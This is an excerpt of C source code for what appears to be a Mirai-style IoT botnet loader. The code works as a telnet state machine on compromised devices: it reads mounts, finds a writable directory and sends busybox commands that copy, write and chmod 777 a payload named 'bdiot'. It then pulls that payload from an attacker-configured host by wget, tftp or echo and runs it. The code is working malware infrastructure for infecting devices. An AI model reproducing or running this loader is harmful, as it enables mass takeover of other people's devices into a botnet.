...
void server_destroy(struct server *srv) {
  if (srv == NULL) return;
  if (srv->bind_addrs != NULL) free(srv->bind_addrs);
  if (srv->workers != NULL) free(srv->workers);
  free(srv);
}
...
void server_telnet_probe(struct server *srv, struct telnet_info *info) {
  ...
  struct server_worker *wrker =
      &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];
...
static void *worker(void *arg) {
  ...
  while (TRUE) {
    ...
    for (i = 0; i < n; i++) handle_event(wrker, &events[i]);
  }
}
        ...
        switch (conn->state_telnet) {
          ...
          case TELNET_PASS_PROMPT:
            ...
            if (consumed) {
              ...
              strcpy(conn->output_buffer.data, "\r\n");
              conn->output_buffer.deadline = time(NULL) + 1;
              conn->state_telnet = TELNET_WAITPASS_PROMPT;  // At the very least
                                                            // it will print
                                                            // SOMETHING
            }
            break;
          ...
          case TELNET_PARSE_PS:
            if ((consumed = connection_consume_psoutput(conn)) > 0) {
              util_sockprintf(conn->fd,
                              "/bin/busybox cat /proc/mounts; " TOKEN_QUERY
                              "\r\n");
          ...
          case TELNET_PARSE_MOUNTS:
            ...
            if (consumed) conn->state_telnet = TELNET_READ_WRITEABLE;
            break;
          case TELNET_READ_WRITEABLE:
            ...
            if (consumed) {
              ...
              util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir,
                              conn->info.writedir);
              util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY
                                        "; >" FN_BINARY
                                        "; /bin/busybox chmod 777 " FN_BINARY
                                        "; " TOKEN_QUERY "\r\n");
          ...
          case TELNET_COPY_ECHO:
            ...
            if (consumed) {
              ...
              if (!conn->info.has_arch) {
                ...
                util_sockprintf(
                    conn->fd,
                    "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY
                    "\r\n");
              }
            }
            break;
          ...
          case TELNET_ARM_SUBTYPE:
            if ((consumed = connection_consume_arm_subtype(conn)) > 0) {
              ...
              if (bin == NULL) {
                printf(
                    "[FD%d] We do not have an ARMv7 binary, so we will try "
                    "using default ARM\n",
                    conn->fd);
              } else
                conn->bin = bin;
            ...
            if (consumed) {
              ...
              switch (conn->info.upload_method) {
                case UPLOAD_ECHO:
                  ...
                  conn->timeout = 30;
                  util_sockprintf(conn->fd,
                                  "/bin/busybox cp " FN_BINARY " " FN_DROPPER
                                  "; > " FN_DROPPER
                                  "; /bin/busybox chmod 777 " FN_DROPPER
                ...
                case UPLOAD_WGET:
                  ...
                  util_sockprintf(
                      conn->fd,
                      "/bin/busybox wget http://%s:%d/bin/%s.%s -O - "
                      "> " FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY
                      "; " EXEC_QUERY "\r\n",
                      wrker->srv->wget_host_ip, wrker->srv->wget_host_port,
                      "bdiot", conn->info.arch, wrker->srv->wget_host_ip, wrker->srv->wget_host_port);
                  printf(
                      "/bin/busybox wget http://%s:%d/bin/%s.%s -O - "
                      "> " FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY
                      "; " EXEC_QUERY "\r\n",
                ...
                case UPLOAD_TFTP:
                  ...
                  util_sockprintf(conn->fd,
                                  ...
                                  "/bin/busybox chmod 777 " FN_BINARY
                                  "; " TOKEN_QUERY "\r\n",
                                  FN_BINARY, "bdiot", conn->info.arch,
                                  wrker->srv->tftp_host_ip);
                  printf("tftp\n");
                  break;
              }
            }
          ...
          case TELNET_UPLOAD_ECHO:
            ...
            if (consumed) {
              ...
              util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n",
                              FN_DROPPER, FN_BINARY, id_tag, conn->info.arch, wrker->srv->wget_host_ip, wrker->srv->wget_host_port);
          ...
          case TELNET_UPLOAD_WGET:
            ...
            if (consumed) {
              ...
              util_sockprintf(conn->fd,
                              "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n",
                              id_tag, conn->info.arch, wrker->srv->wget_host_ip, wrker->srv->wget_host_port);
          ...
          case TELNET_UPLOAD_TFTP:
            ...
            {
              printf(
                  "[FD%d] No permission to TFTP load, falling back to echo!\n",
                  conn->fd);
              consumed *= -1;
              conn->state_telnet = TELNET_UPLOAD_ECHO;
              ...
              conn->timeout = 30;
              util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY
                                        " " FN_DROPPER "; > " FN_DROPPER
                                        "; /bin/busybox chmod 777 " FN_DROPPER
                                        "; " TOKEN_QUERY "\r\n");
            }
            break;
          case TELNET_RUN_BINARY:
            if ((consumed = connection_verify_payload(conn)) > 0) {
              if (consumed >= 255) {
                ...
                if (!conn->retry_bin &&
                    strncmp(conn->info.arch, "arm", 3) == 0) {
                  conn->echo_load_pos = 0;
                  strcpy(conn->info.arch,
                         (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
              ...
              //util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY
               //                         "; " TOKEN_QUERY "\r\n");
              util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
...
static void *timeout_thread(void *arg) {
  ...
  while (TRUE) {
    ...
    for (i = 0; i < (srv->max_open * 2); i++) {
      ...
      if (conn->open && conn->last_recv > 0 &&
          ct - conn->last_recv > conn->timeout) {
        printf("[FD%d] Timed out\n", conn->fd);
        if (conn->state_telnet == TELNET_RUN_BINARY && !conn->ctrlc_retry &&
            strncmp(conn->info.arch, "arm", 3) == 0) {
          conn->last_recv = time(NULL);
      ...
      } else if (conn->open && conn->output_buffer.deadline != 0 &&
                 time(NULL) > conn->output_buffer.deadline) {
